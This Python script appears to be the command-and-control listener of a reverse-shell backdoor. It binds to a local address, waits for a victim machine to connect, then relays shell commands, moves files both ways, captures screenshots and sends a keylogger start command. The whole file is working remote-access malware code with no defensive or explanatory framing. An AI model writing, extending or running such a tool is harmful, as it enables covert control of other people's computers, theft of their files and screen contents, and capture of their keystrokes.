#!/usr/bin/python3
import socket
import json
import base64

count = 1

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data += target.recv(1024).decode()
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue

def shell():
    global count
    while True:
        command = input(f"* Shell#~{str(ip)}: ")
        reliable_send(command)
        if command == 'q':
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:12] == "keylog_start":
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                result = reliable_recv()
                file.write(base64.b64decode(result))
                print("[+] File downloaded successfully.")
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()).decode())
                    print("[+] File uploaded successfully.")
            except FileNotFoundError:
                print("[!!] File not found.")
        elif command[:10] == "screenshot":
            with open(f"screenshot{count}.png", "wb") as screen:
                image = reliable_recv()
                image_decoded = base64.b64decode(image)
                if image_decoded[:4] == b"[!!]":
                    print(image_decoded.decode())
                else:
                    screen.write(image_decoded)
                    print(f"[+] Screenshot saved as screenshot{count}.png")
                    count += 1
        else:
            result = reliable_recv()
            print(result)

def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.1.112", 54321))
    s.listen(5)
    print("[*] Listening for incoming connections...")
    target, ip = s.accept()
    print(f"[+] Connection established with: {ip}")

server()
shell()
